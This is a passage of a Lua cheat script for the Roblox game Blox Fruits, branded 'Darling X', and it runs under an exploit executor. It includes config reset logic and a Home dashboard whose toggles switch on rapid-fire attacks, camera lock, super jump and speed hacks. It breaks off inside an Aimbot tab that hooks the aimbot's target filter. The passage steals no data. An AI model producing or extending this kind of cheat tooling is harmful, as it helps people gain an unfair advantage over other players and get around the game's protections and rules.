    ["Target Hitbox"] = 1,
    ["FOV Position"] = 1,
    ["FOV Color"] = 1,
    ["Tracer Mode"] = 1,
    ["Tracer Origin"] = 1,
    ["Tracer Color"] = 1,
    ["Camlock Keybind"] = 1,
    ["Sanguine Keybind"] = 1,
    ["Soru Target Mode"] = 1,
    ["Combo Weapon"] = 1,
    ["Combo Key"] = 1,
    ["ESP Style"] = 1,
    ["Chams Highlight Color"] = 1,
    ["Player Tracer Color"] = 1,
    ["Interface Language"] = 1,
    ["Glass Transparency"] = 2,
    ["Interface Scale"] = 2,
    ["Direct Wallpaper"] = 1,
    ["Typography Font"] = 1,
    ["Target Player Selection"] = 1,
    ["Macro Slot"] = 1,
    ["Trigger Key (PC)"] = 1,
    ["B1 Weapon"] = 1,
    ["B1 Skill Key"] = 1,
    ["B1 Mode"] = 1,
    ["B2 Weapon"] = 2,
    ["B2 Skill Key"] = 2,
    ["B2 Mode"] = 1,
    ["B3 Weapon"] = 1,
    ["B3 Skill Key"] = 3,
    ["B3 Mode"] = 1,
    ["B4 Weapon"] = 4,
    ["B4 Skill Key"] = 1,
    ["B4 Mode"] = 1,
    ["B5 Weapon"] = 3,
    ["B5 Skill Key"] = 4,
    ["B5 Mode"] = 1,
    ["B6 Weapon"] = 1,
    ["B6 Skill Key"] = 2,
    ["B6 Mode"] = 1,
}

ResetConfigProfile = function()
    suspendSave = true
    if autoSaveThread then
        pcall(task.cancel, autoSaveThread)
        autoSaveThread = nil
    end

    local ok, err = pcall(function()
        -- 1. Reset all Toggles to registered default state
        for key, entry in pairs(UI_TOGGLES) do
            local def = entry.default
            if def == nil then
                def = DEFAULT_TOGGLES[key]
            end
            if def == nil then
                def = false
            end
            pcall(function()
                entry.set(def == true, true)
            end)
        end

        -- 2. Reset all Sliders to default value
        for key, entry in pairs(UI_SLIDERS) do
            local def = entry.default or DEFAULT_SLIDERS[key]
            if def ~= nil then
                pcall(function()
                    entry.set(def, true)
                end)
            end
        end

        -- 3. Reset all Choices to default index
        for key, entry in pairs(UI_CHOICES) do
            local def = entry.default or DEFAULT_CHOICES[key] or 1
            pcall(function()
                entry.set(def, true)
            end)
        end

        -- 4. Reset all Inputs to default
        for key, entry in pairs(UI_INPUTS) do
            local def = entry.default or ""
            pcall(function()
                entry.set(def)
            end)
        end

        -- 5. Reset Theme and Wallpaper
        pcall(function()
            if THEMES and THEMES["White"] then
                ApplyTheme("White")
            end
            if SetWallpaper then
                SetWallpaper(1)
            end
        end)

        -- 6. Reset modular subsystems to game defaults
        local moveMod = RequireModule("modules/mobility/movement_engine.lua")
        if moveMod and moveMod.ResetAll then pcall(moveMod.ResetAll) end

        local autoCombat = RequireModule("modules/pvp/auto_combat.lua")
        if autoCombat and autoCombat.ResetAll then pcall(autoCombat.ResetAll) end

        local camlockMod = RequireModule("modules/pvp/camlock.lua")
        if camlockMod and camlockMod.ResetAll then pcall(camlockMod.ResetAll) end

        local clientTweaks = nil
local function getClientTweaks()
    if not clientTweaks then
        clientTweaks = RequireModule("modules/misc/client_tweaks.lua")
    end
    return clientTweaks
end
task.spawn(function() pcall(getClientTweaks) end)
        if clientTweaks and clientTweaks.ResetAll then pcall(clientTweaks.ResetAll) end

        local ew = _G.DarlingX_ExtraWidgets
        if ew then
            pcall(function()
                ew.SetSuperJumpWidgetVisible(false)
                ew.SetCamlockWidgetVisible(false)
                ew.SetDragonM1WidgetVisible(false)
                ew.SetSanguineWidgetVisible(false)
            end)
        end

        local macroMod = RequireModule("modules/macro/macro_engine.lua")
        if macroMod then
            pcall(function()
                if macroMod.toggle then macroMod.toggle(false) end
                if macroMod.stopMacro then macroMod.stopMacro() end
                if macroMod.ensureMobileButton then macroMod.ensureMobileButton(false) end
            end)
        end

        if SetFPSPingVisible then
            pcall(SetFPSPingVisible, false)
        end

        _G.DarlingX_Fly = false
        _G.DarlingX_ShowFPS = false
        _G.DarlingX_IgnoreAllies = false
        _G.DarlingX_IgnorePvPOff = false
        _G.DarlingX_IgnoreSafeZone = false

        -- 7. Reset files on disk (write clean defaults to ALL config paths without deleting)
        local sOk, sErr = false, nil
        if SaveConfigProfile then
            sOk, sErr = SaveConfigProfile(true)
        end
        if not sOk then
            local fn = (type(writefile) == "function" and writefile) or getExecutorFunc("writefile") or getExecutorFunc("writeFile")
            if fn then
                for _, p in ipairs(CONFIG_PATHS) do
                    pcall(fn, p, "{}")
                end
            end
        end

        Notify("Config", "Configuration profile reset to defaults.", 2.5, true)
        print("[Darling X] Configuration profile completely reset to defaults.")
        return true
    end)

    suspendSave = false
    return ok, err
end

-- ========================================================================
-- CLIENT TWEAKS & PERFORMANCE MODULE DELEGATION
-- ========================================================================
local clientTweaks = nil
local function getClientTweaks()
    if not clientTweaks then
        clientTweaks = RequireModule("modules/misc/client_tweaks.lua")
    end
    return clientTweaks
end
task.spawn(function() pcall(getClientTweaks) end)

local function SetFFlags1(state)
    local ct = getClientTweaks()
    if ct and ct.SetFFlags1 then
        ct.SetFFlags1(state)
    end
end

local function ApplyFastFFlags()
    if UI_TOGGLES["FFlags 1 (FPS Booster)"] then
        UI_TOGGLES["FFlags 1 (FPS Booster)"].set(true, true)
    else
        local ct = getClientTweaks()
        if ct and ct.ApplyFastFFlags then
            ct.ApplyFastFFlags()
        end
    end
end

local function SetNoAnimations(state)
    local ct = getClientTweaks()
    if ct and ct.SetNoAnimations then
        ct.SetNoAnimations(state)
    end
end

_G.DarlingX.UI_TOGGLES = UI_TOGGLES
_G.DarlingX.UI_SLIDERS = UI_SLIDERS
_G.DarlingX.UI_CHOICES = UI_CHOICES
_G.DarlingX.UI_INPUTS = UI_INPUTS
_G.DarlingX.SaveConfig = function(...) if SaveConfigProfile then return SaveConfigProfile(...) end end
_G.DarlingX.LoadConfig = function(...) if LoadConfigProfile then return LoadConfigProfile(...) end end
_G.DarlingX.ResetConfig = function(...) if ResetConfigProfile then return ResetConfigProfile(...) end end
_G.DarlingX.ApplyFastFFlags = ApplyFastFFlags
_G.DarlingX.SetFFlags1 = SetFFlags1
_G.DarlingX.SetNoAnimations = SetNoAnimations

local WallpaperListeners = {}
local function RegisterWallpaperListener(fn)
    table.insert(WallpaperListeners, fn)
end

-- Wallpaper Switcher: ONLY changes WallpaperImage, NEVER the LogoBadge or FloatingOpen!
local function SetWallpaper(index, button)
    currentBgIdx = ((index - 1) % #WALLPAPERS) + 1
    local selectedWallpaper = WALLPAPERS[currentBgIdx]
    if button then button.Text = "Background: " .. selectedWallpaper.name end

    for _, fn in ipairs(WallpaperListeners) do
        pcall(fn, currentBgIdx, selectedWallpaper)
    end
    if TriggerAutoSave then TriggerAutoSave() end

    if selectedWallpaper.id == "" or selectedWallpaper.name:find("None") then
        WallpaperImage.Image = ""
        WallpaperImage.ImageTransparency = 1
        Notify("Background", "Wallpaper removed (Clean Dark Glass)")
        return
    end

    -- Immediate visual switch to fallback/preset decal
    if selectedWallpaper.id and selectedWallpaper.id ~= "" then
        WallpaperImage.Image = selectedWallpaper.id
        WallpaperImage.ImageTransparency = 0
    end

    task.spawn(function()
        Notify("Background", "Loading: " .. selectedWallpaper.name)
        local asset = ResolveWallpaperAsset(selectedWallpaper)
        if asset and asset ~= "" then
            WallpaperImage.Image = asset
            WallpaperImage.ImageTransparency = 0
            pcall(function() ContentProvider:PreloadAsync({ WallpaperImage }) end)
            Notify("Background", "Applied: " .. selectedWallpaper.name)
        end
    end)
end

local function ApplyCustomWallpaper(input)
    if not input or type(input) ~= "string" then return end
    local clean = input:gsub("^%s+", ""):gsub("%s+$", "")
    if #clean == 0 or clean:lower() == "none" or clean:lower() == "clear" then
        WallpaperImage.Image = ""
        WallpaperImage.ImageTransparency = 1
        Notify("Wallpaper", "Wallpaper removed (Clean Glass Mode)")
        return
    end

    if clean:match("^%d+$") then
        local assetId = "rbxassetid://" .. clean
        WallpaperImage.Image = assetId
        WallpaperImage.ImageTransparency = 0
        pcall(function() ContentProvider:PreloadAsync({ WallpaperImage }) end)
        Notify("Wallpaper", "Applied Asset ID: " .. clean)
        return
    elseif clean:match("^rbxassetid://") then
        WallpaperImage.Image = clean
        WallpaperImage.ImageTransparency = 0
        pcall(function() ContentProvider:PreloadAsync({ WallpaperImage }) end)
        Notify("Wallpaper", "Applied Custom Asset")
        return
    elseif clean:match("^https?://") then
        task.spawn(function()
            Notify("Wallpaper", "Downloading custom media...")
            local body = SafeHttpGet(clean)
            if body and #body > 50 and exWriteFile and exGetCustomAsset then
                local ext = clean:match("%.(%w+)%??") or "png"
                local fileName = "custom_bg_" .. tostring(#clean) .. "." .. ext
                pcall(exWriteFile, fileName, body)
                local ok, asset = pcall(exGetCustomAsset, fileName)
                if ok and type(asset) == "string" and #asset > 0 then
                    WallpaperImage.Image = asset
                    WallpaperImage.ImageTransparency = 0
                    pcall(function() ContentProvider:PreloadAsync({ WallpaperImage }) end)
                    Notify("Wallpaper", "Custom wallpaper downloaded and applied")
                    return
                end
            end
            Notify("Wallpaper", "Could not load custom URL asset")
        end)
    else
        Notify("Wallpaper", "Invalid Asset ID or URL format")
    end
end

local function ResetUIConfig()
    ApplyFont("Gotham")
    SetWallpaper(1)
    UpdateMobileScale()
    if WallpaperDimOverlay then WallpaperDimOverlay.BackgroundTransparency = 0.35 end
    MaxRainDrops = 14
    RainEnabled = true
    RainbowSpeed = 0.4
    ResetTheme()
    for _, frame in ipairs(GlassFrames) do
        if frame and frame.Parent then frame.BackgroundTransparency = 0.65 end
    end
    for _, setToggle in ipairs(ToggleControls) do setToggle(true) end
end

-- ============================================================
-- GLOBAL MODULE GETTERS & UI SYNCHRONIZATION
-- ============================================================
local M = { cache = {} }
function M.get(path)
    if not M.cache[path] then M.cache[path] = RequireModule(path) end
    return M.cache[path]
end
function M.getFastAttack() return M.get("modules/pvp/fast_attack.lua") end
function M.getDragonGun() return M.get("modules/pvp/dragon_gun_m1.lua") end
function M.getSanguineBoost() return M.get("modules/pvp/sanguine_boost.lua") end
function M.getExtraWidgets() return M.get("modules/pvp/extra_widgets.lua") end
function M.getAutoCombat() return M.get("modules/pvp/auto_combat.lua") end
function M.getCamlock() return M.get("modules/pvp/camlock.lua") end
function M.getMoveMod() return M.get("modules/mobility/movement_engine.lua") end

_G.DarlingX_SyncCamlockUI = function(active)
    if UI_TOGGLES and UI_TOGGLES["Camlock"] and UI_TOGGLES["Camlock"].set then
        pcall(function()
            UI_TOGGLES["Camlock"].set(active == true, false)
        end)
    end
end

-- ============================================================
-- MODULAR TAB REGISTRATION
-- ============================================================

-- 1. HOME TAB (LUXURY GLASS DASHBOARD WITH SLEEK HEALTH & ENERGY CAPSULES)
local HomePage = RegisterTab("Home", "Home", "house")
pcall(function()
    -- Player Profile Identity Card
    local profileCard = CreateCard(HomePage, nil)
    local pRow = Instance.new("Frame", profileCard)
    pRow.Size = UDim2.new(1, 0, 0, 52)
    pRow.BackgroundTransparency = 1

    local avatarFrame = Instance.new("Frame", pRow)
    avatarFrame.Size = UDim2.new(0, 48, 0, 48)
    avatarFrame.Position = UDim2.new(0, 2, 0.5, -24)
    avatarFrame.BackgroundColor3 = Color3.fromRGB(20, 18, 30)
    Instance.new("UICorner", avatarFrame).CornerRadius = UDim.new(1, 0)
    local aStroke = Instance.new("UIStroke", avatarFrame)
    aStroke.Thickness = 1.4
    RegisterThemeStroke(aStroke)

    local avatarImg = Instance.new("ImageLabel", avatarFrame)
    avatarImg.Size = UDim2.new(1, 0, 1, 0)
    avatarImg.BackgroundTransparency = 1
    avatarImg.Image = GetLogoAsset()
    avatarImg.ScaleType = Enum.ScaleType.Crop
    Instance.new("UICorner", avatarImg).CornerRadius = UDim.new(1, 0)

    -- Status dot on avatar
    local statusDot = Instance.new("Frame", avatarFrame)
    statusDot.Size = UDim2.new(0, 10, 0, 10)
    statusDot.Position = UDim2.new(1, -9, 1, -9)
    statusDot.BackgroundColor3 = Color3.fromRGB(16, 185, 129)
    Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
    local sdotStroke = Instance.new("UIStroke", statusDot)
    sdotStroke.Color = Color3.fromRGB(12, 10, 18)
    sdotStroke.Thickness = 1.5

    -- Load player thumbnail asynchronously in background so main thread NEVER yields or hangs
    task.spawn(function()
        pcall(function()
            if lp and lp.UserId then
                local avatarUrl = Players:GetUserThumbnailAsync(lp.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
                if avatarUrl and avatarImg and avatarImg.Parent then
                    avatarImg.Image = avatarUrl
                end
            end
        end)
    end)

    local dNameLbl = Instance.new("TextLabel", pRow)
    dNameLbl.Size = UDim2.new(1, -60, 0, 16)
    dNameLbl.Position = UDim2.new(0, 58, 0, 2)
    dNameLbl.BackgroundTransparency = 1
    dNameLbl.Text = lp and lp.DisplayName or "Player"
    dNameLbl.Font = Enum.Font.GothamBold
    dNameLbl.TextSize = 13
    dNameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    dNameLbl.TextXAlignment = Enum.TextXAlignment.Left

    local uNameLbl = Instance.new("TextLabel", pRow)
    uNameLbl.Size = UDim2.new(1, -60, 0, 13)
    uNameLbl.Position = UDim2.new(0, 58, 0, 19)
    uNameLbl.BackgroundTransparency = 1
    uNameLbl.Text = "@" .. (lp and lp.Name or "username")
    uNameLbl.Font = Enum.Font.GothamSemibold
    uNameLbl.TextSize = 9
    uNameLbl.TextColor3 = CurrentAccent
    uNameLbl.TextXAlignment = Enum.TextXAlignment.Left
    RegisterThemeText(uNameLbl)

    local badgeRow = Instance.new("Frame", pRow)
    badgeRow.Size = UDim2.new(1, -60, 0, 14)
    badgeRow.Position = UDim2.new(0, 58, 0, 34)
    badgeRow.BackgroundTransparency = 1

    local bLayout = Instance.new("UIListLayout", badgeRow)
    bLayout.FillDirection = Enum.FillDirection.Horizontal
    bLayout.Padding = UDim.new(0, 6)

    local function makeMicroBadge(txt)
        local b = Instance.new("Frame", badgeRow)
        b.Size = UDim2.new(0, 0, 1, 0)
        b.AutomaticSize = Enum.AutomaticSize.X
        b.BackgroundColor3 = Color3.fromRGB(22, 18, 30)
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
        local bPad = Instance.new("UIPadding", b)
        bPad.PaddingLeft = UDim.new(0, 5); bPad.PaddingRight = UDim.new(0, 5)
        local l = Instance.new("TextLabel", b)
        l.Size = UDim2.new(0, 0, 1, 0)
        l.AutomaticSize = Enum.AutomaticSize.X
        l.BackgroundTransparency = 1
        l.Text = txt
        l.Font = Enum.Font.GothamBold
        l.TextSize = 7.5
        l.TextColor3 = Color3.fromRGB(180, 175, 195)
    end
    makeMicroBadge("UID: " .. (lp and tostring(lp.UserId) or "0"))
    makeMicroBadge("AGE: " .. (lp and tostring(lp.AccountAge) or "0") .. "d")
    makeMicroBadge("DARLING X " .. APP_VERSION)

    -- Quick Actions Card (Replaces Non-Working Health & Energy HUD)
    local quickCard = CreateCard(HomePage, "Quick Actions")

    AddToggle(quickCard, "Show FPS & Ping", "Display real-time FPS and ping overlay top-left", false, function(state)
        SetFPSPingVisible(state)
        Notify("Telemetry", "FPS & Ping: " .. (state and "Visible" or "Hidden"))
    end)

    AddToggle(quickCard, "Fast Attack", "Rapid weapon hit bursts", false, function(state)
        _G.DarlingX_FastAttack = state
        local fa = M.getFastAttack()
        if fa then if state then fa.enable() else fa.disable() end end
        Notify("Combat", "Fast Attack: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(quickCard, "Dragon Gun M1", "Rapid fire M1 gun shots", false, function(state)
        _G.DarlingX_DragonM1Enabled = state
        local dg = M.getDragonGun()
        local ew = M.getExtraWidgets()
        if dg then dg.SetEnabled(state) end
        if ew then
            ew.SetDragonM1WidgetVisible(state)
            ew.UpdateDragonM1Visual(state)
        end
        Notify("Combat", "Dragon Gun M1: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(quickCard, "Camlock", "Lock camera onto enemy", false, function(state)
        local cl = M.getCamlock()
        if cl then cl.SetEnabled(state) end
        Notify("Combat", "Camlock: " .. (state and "Locked" or "Unlocked"))
    end)

    AddToggle(quickCard, "Sanguine Boost", "Forward velocity boost", false, function(state)
        _G.DarlingX_SanguineBoost = state
        local sb = M.getSanguineBoost()
        local ew = M.getExtraWidgets()
        if sb then sb.SetEnabled(state) end
        if ew then ew.SetSanguineWidgetVisible(state) end
        Notify("Combat", "Sanguine Boost: " .. (state and "Active" or "Inactive"))
    end)

    AddToggle(quickCard, "Super Jump", "High jump leap", false, function(state)
        local mm = M.getMoveMod()
        if mm then mm.SetSuperJump(state) end
        Notify("Movement", "Super Jump: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(quickCard, "Custom WalkSpeed", "Speed up player movement", false, function(state)
        local mm = M.getMoveMod()
        if mm then mm.SetWalkSpeed(state) end
        Notify("Movement", "WalkSpeed: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(quickCard, "FFlags 1 (FPS Booster)", "120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris", false, function(state)
        SetFFlags1(state)
    end)

    AddButton(quickCard, "Apply Fast FFlags", function()
        ApplyFastFFlags()
    end)

    -- Atmosphere Wallpaper Card (Quick Atmosphere Switcher on Home)
    local wpHomeCard = CreateCard(HomePage, "Wallpaper")

    local wpHomeStatus = Instance.new("TextLabel", wpHomeCard)
    wpHomeStatus.Size = UDim2.new(1, 0, 0, 18)
    wpHomeStatus.BackgroundTransparency = 1
    wpHomeStatus.Text = string.format("Active: [%02d/%02d] %s", currentBgIdx, #WALLPAPERS, WALLPAPERS[currentBgIdx].name)
    wpHomeStatus.Font = Enum.Font.GothamBold
    wpHomeStatus.TextSize = 9
    wpHomeStatus.TextColor3 = CurrentAccent
    wpHomeStatus.TextXAlignment = Enum.TextXAlignment.Left
    RegisterThemeText(wpHomeStatus)

    local wpNamesListHome = {}
    for i, wp in ipairs(WALLPAPERS) do
        table.insert(wpNamesListHome, string.format("[%02d] %s", i, wp.name))
    end

    local wpHomeChoice = AddChoice(wpHomeCard, "Direct Wallpaper", wpNamesListHome, currentBgIdx, function(val, idx)
        SetWallpaper(idx)
    end)

    -- Navigation row: Previous, Shuffle, Next
    local navRowHome = Instance.new("Frame", wpHomeCard)
    navRowHome.Size = UDim2.new(1, 0, 0, 28)
    navRowHome.BackgroundTransparency = 1

    local nLayoutHome = Instance.new("UIGridLayout", navRowHome)
    nLayoutHome.CellSize = UDim2.new(0.333, -5, 1, 0)
    nLayoutHome.CellPadding = UDim.new(0, 7, 0, 0)

    local function makeHomeNavBtn(txt, callback)
        local btn = Instance.new("TextButton", navRowHome)
        btn.BackgroundColor3 = Color3.fromRGB(22, 18, 32)
        btn.BackgroundTransparency = 0.45
        btn.Text = txt
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 8.5
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.AutoButtonColor = false
        btn.Active = true
        btn.Selectable = true
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        local bStr = Instance.new("UIStroke", btn)
        bStr.Color = CurrentAccent
        bStr.Thickness = 0.8
        bStr.Transparency = 0.5
        RegisterThemeStroke(bStr)
        RegisterTranslatable(btn, txt)
        ConnectButton(btn, callback)
        return btn
    end

    makeHomeNavBtn("Previous (‹)", function()
        local prevIdx = currentBgIdx - 1
        if prevIdx < 1 then prevIdx = #WALLPAPERS end
        SetWallpaper(prevIdx)
    end)

    makeHomeNavBtn("Random (Shuffle)", function()
        local randIdx = math.random(1, #WALLPAPERS)
        SetWallpaper(randIdx)
    end)

    makeHomeNavBtn("Next (›)", function()
        local nextIdx = currentBgIdx + 1
        if nextIdx > #WALLPAPERS then nextIdx = 1 end
        SetWallpaper(nextIdx)
    end)

    RegisterWallpaperListener(function(idx, wp)
        if wpHomeStatus and wpHomeStatus.Parent then
            wpHomeStatus.Text = string.format("Active: [%02d/%02d] %s", idx, #WALLPAPERS, wp.name)
        end
        if wpHomeChoice and wpHomeChoice.SetIndex then
            wpHomeChoice.SetIndex(idx, false)
        end
    end)

    -- In-Game Attributes Bento Grid Card
    local statsCard = CreateCard(HomePage, "Game Stats")
    local grid = Instance.new("Frame", statsCard)
    grid.Size = UDim2.new(1, 0, 0, 84)
    grid.BackgroundTransparency = 1
    local gLayout = Instance.new("UIGridLayout", grid)
    gLayout.CellSize = UDim2.new(0.333, -6, 0, 38)
    gLayout.CellPadding = UDim2.new(0, 8, 0, 8)

    local function createStatPill(headerText, initialVal)
        local frame = Instance.new("Frame", grid)
        frame.BackgroundColor3 = Color3.fromRGB(18, 14, 28)
        frame.BackgroundTransparency = 0.5
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
        local fStr = Instance.new("UIStroke", frame)
        fStr.Color = Color3.fromRGB(44, 38, 60)
        fStr.Thickness = 0.8

        local t = Instance.new("TextLabel", frame)
        t.Size = UDim2.new(1, -8, 0, 12)
        t.Position = UDim2.new(0, 4, 0, 4)
        t.BackgroundTransparency = 1
        t.Text = headerText
        RegisterTranslatable(t, headerText)
        t.Font = Enum.Font.Gotham
        t.TextSize = 7.5
        t.TextColor3 = Color3.fromRGB(150, 145, 175)
        t.TextXAlignment = Enum.TextXAlignment.Center

        local v = Instance.new("TextLabel", frame)
        v.Size = UDim2.new(1, -8, 0, 18)
        v.Position = UDim2.new(0, 4, 0, 16)
        v.BackgroundTransparency = 1
        v.Text = initialVal
        v.Font = Enum.Font.GothamBold
        v.TextSize = 9.5
        v.TextColor3 = Color3.fromRGB(255, 255, 255)
        v.TextXAlignment = Enum.TextXAlignment.Center

        return v
    end

    local statLevel = createStatPill("LEVEL", "--")
    local statBeli = createStatPill("BELI", "--")
    local statBounty = createStatPill("BOUNTY", "--")
    local statFruit = createStatPill("FRUIT", "--")
    local statRace = createStatPill("RACE", "--")
    local statTeam = createStatPill("FACTION", "--")

    -- Performance & Network Telemetry Card
    local netCard = CreateCard(HomePage, "System Info")
    local nGrid = Instance.new("Frame", netCard)
    nGrid.Size = UDim2.new(1, 0, 0, 36)
    nGrid.BackgroundTransparency = 1
    local ngLayout = Instance.new("UIGridLayout", nGrid)
    ngLayout.CellSize = UDim2.new(0.25, -6, 0, 34)
    ngLayout.CellPadding = UDim2.new(0, 8, 0, 0)

    local function createNetPill(headerText, initialVal)
        local frame = Instance.new("Frame", nGrid)
        frame.BackgroundColor3 = Color3.fromRGB(18, 14, 28)
        frame.BackgroundTransparency = 0.5
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
        local fStr = Instance.new("UIStroke", frame)
        fStr.Color = Color3.fromRGB(44, 38, 60)
        fStr.Thickness = 0.8

        local t = Instance.new("TextLabel", frame)
        t.Size = UDim2.new(1, 0, 0, 11)
        t.Position = UDim2.new(0, 0, 0, 3)
        t.BackgroundTransparency = 1
        t.Text = headerText
        RegisterTranslatable(t, headerText)
        t.Font = Enum.Font.Gotham
        t.TextSize = 7.5
        t.TextColor3 = Color3.fromRGB(150, 145, 175)
        t.TextXAlignment = Enum.TextXAlignment.Center

        local v = Instance.new("TextLabel", frame)
        v.Size = UDim2.new(1, 0, 0, 16)
        v.Position = UDim2.new(0, 0, 0, 15)
        v.BackgroundTransparency = 1
        v.Text = initialVal
        v.Font = Enum.Font.GothamBold
        v.TextSize = 9
        v.TextColor3 = CurrentAccent
        v.TextXAlignment = Enum.TextXAlignment.Center
        RegisterThemeText(v)

        return v
    end

    local itemPing = createNetPill("PING", "0 ms")
    local itemFps = createNetPill("FPS", "60")
    local itemPlayers = createNetPill("PLAYERS", "0")
    local itemUptime = createNetPill("UPTIME", "0s")

    AddButton(netCard, "Copy Server JobId", function()
        pcall(function()
            if setclipboard then
                setclipboard(tostring(game.JobId))
                Notify("Server", "Copied JobId to clipboard!")
            end
        end)
    end)

    AddButton(netCard, "Rejoin Current Server", function()
        RejoinServer()
    end)



    -- Live Telemetry Thread
    task.spawn(function()
        local startTime = os.clock()
        local fpsCount = 0
        local lastFpsCheck = os.clock()
        local fpsConn = nil
        fpsConn = RunService.RenderStepped:Connect(function()
            fpsCount = fpsCount + 1
            if os.clock() - lastFpsCheck >= 1 then
                if itemFps and itemFps.Parent then
                    itemFps.Text = fpsCount .. " FPS"
                end
                fpsCount = 0
                lastFpsCheck = os.clock()
            end
        end)

        local statTick = 0
        while IsScriptRunning do
            pcall(function()
                statTick = statTick + 1
                -- Game Stats (throttled to every ~3 seconds)
                if statTick >= 3 or statTick == 1 then
                    statTick = 0
                    local data = lp and (lp:FindFirstChild("Data") or lp:FindFirstChild("leaderstats"))
                    if data then
                        local lvl = data:FindFirstChild("Level")
                        statLevel.Text = lvl and tostring(lvl.Value) or "--"

                        local beli = data:FindFirstChild("Beli")
                        statBeli.Text = beli and ("$" .. FormatNumber(beli.Value)) or "--"

                        local bnty = data:FindFirstChild("Bounty") or data:FindFirstChild("Bounty/Honor")
                        statBounty.Text = bnty and FormatNumber(bnty.Value) or "--"

                        local df = data:FindFirstChild("DevilFruit")
                        statFruit.Text = df and tostring(df.Value):gsub("-%w+", "") or "None"

                        local race = data:FindFirstChild("Race")
                        statRace.Text = race and tostring(race.Value) or "--"
                    else
                        if hum then
                            statLevel.Text = "WS: " .. math.floor(hum.WalkSpeed)
                            statBeli.Text = "JP: " .. math.floor(hum.JumpPower)
                        end
                    end

                    if lp and lp.Team then
                        statTeam.Text = tostring(lp.Team.Name)
                    end
                end

                -- Telemetry (updated every 1s)
                local ping = 0
                local statsService = game:GetService("Stats")
                pcall(function()
                    ping = math.floor(statsService.Network.ServerStatsItem["Data Ping"]:GetValue())
                end)
                if ping == 0 and lp then
                    pcall(function() ping = math.floor(lp:GetNetworkPing() * 1000) end)
                end
                itemPing.Text = ping .. " ms"
                if ping < 100 then
                    itemPing.TextColor3 = Color3.fromRGB(16, 215, 135)
                elseif ping < 200 then
                    itemPing.TextColor3 = Color3.fromRGB(245, 180, 20)
                else
                    itemPing.TextColor3 = Color3.fromRGB(245, 60, 60)
                end

                local elapsed = math.floor(os.clock() - startTime)
                local mins = math.floor(elapsed / 60)
                local secs = elapsed % 60
                itemUptime.Text = mins .. "m " .. secs .. "s"
                itemPlayers.Text = #Players:GetPlayers() .. "/" .. Players.MaxPlayers
            end)
            task.wait(1.0)
        end
        if fpsConn then
            pcall(function() fpsConn:Disconnect() end)
            fpsConn = nil
        end
    end)
end)

-- 2. AIMBOT TAB (MODULAR COMBAT ENGINE)
local AimbotPage = RegisterTab("Aimbot", "Aimbot", "crosshair")
local okAimbot, errAimbot = pcall(function()
    local function isPlayerAlly(player)
        if not player or player == lp then return false end
        local ok, ally = pcall(function()
            local main = lp and lp:FindFirstChild("PlayerGui") and lp.PlayerGui:FindFirstChild("Main")
            local frame = main and main:FindFirstChild("Allies")
                and main.Allies:FindFirstChild("Container")
                and main.Allies.Container:FindFirstChild("Allies")
                and main.Allies.Container.Allies:FindFirstChild("ScrollingFrame")
                and main.Allies.Container.Allies.ScrollingFrame:FindFirstChild("Frame")
            if frame and frame:FindFirstChild(player.Name) then return true end

            local myTeam = lp and lp.Team
            local targetTeam = player.Team
            if myTeam and targetTeam and myTeam == targetTeam then return true end
            if myTeam and targetTeam and myTeam.Name == "Marines" and targetTeam.Name == "Marines" then return true end
            return false
        end)
        return ok and ally
    end

    local function isPlayerPvPEnabled(player)
        if not player or player == lp then return false end
        local ok, enabled = pcall(function()
            if player:GetAttribute("PvpDisabled") == true then return false end
            local char = player.Character
            if char then
                if char:FindFirstChildOfClass("ForceField") then return false end
                if char:GetAttribute("PvpDisabled") == true then return false end
            end
            return true
        end)
        return not ok or enabled
    end

    local function isPlayerInSafeZone(player)
        if not player or player == lp then return false end
        local ok, inZone = pcall(function()
            local char = player.Character
            if not char then return false end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum and hum.Sit == true then return true end
            if char:FindFirstChildOfClass("ForceField") then return true end
            if char:GetAttribute("SafeZone") == true then return true end
            if player:GetAttribute("SafeZone") == true then return true end

            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return false end
            local hrpPos = hrp.Position

            local function checkFolder(folder)
                if not folder then return false end
                for _, zone in ipairs(folder:GetChildren()) do
                    if zone:IsA("BasePart") then
                        local mesh = zone:FindFirstChild("Mesh")
                        local radius = 0
                        if mesh and mesh:IsA("SpecialMesh") then
                            radius = (zone.Size.X * mesh.Scale.X) / 2
                        else
                            radius = math.min(zone.Size.X, zone.Size.Z) / 2
                        end
                        if radius > 500 then radius = 350 end
                        if radius <= 0 then radius = 350 end
                        if (zone.Position - hrpPos).Magnitude <= radius then return true end

                        local localPos = zone.CFrame:PointToObjectSpace(hrpPos)
                        local halfSize = zone.Size / 2
                        if math.abs(localPos.X) <= halfSize.X and math.abs(localPos.Y) <= halfSize.Y + 25 and math.abs(localPos.Z) <= halfSize.Z then
                            return true
                        end
                    end
                end
                return false
            end

            local wo = Workspace:FindFirstChild("_WorldOrigin")
            if wo and checkFolder(wo:FindFirstChild("SafeZones")) then return true end
            if wo and checkFolder(wo:FindFirstChild("TempSafeZones")) then return true end
            if checkFolder(Workspace:FindFirstChild("SafeZones")) then return true end
            local map = Workspace:FindFirstChild("Map")
            if map and checkFolder(map:FindFirstChild("SafeZones")) then return true end
            return false
        end)
        return ok and inZone
    end

    local function hookAimbotTargetFilter()
        pcall(function()
            local core = RequireModule("modules/combat/aimbot_core.lua")
            if core and not core._DarlingFilterHooked then
                core._DarlingFilterHooked = true
                local origBlacklisted = core.isPlayerBlacklisted
                core.isPlayerBlacklisted = function(player)
                    if not player then return false end
                    if origBlacklisted and origBlacklisted(player) then return true end

                    if _G.DarlingX_IgnoreAllies and isPlayerAlly(player) then
                        return true
                    end
                    if _G.DarlingX_IgnorePvPOff and not isPlayerPvPEnabled(player) then
                        return true
                    end
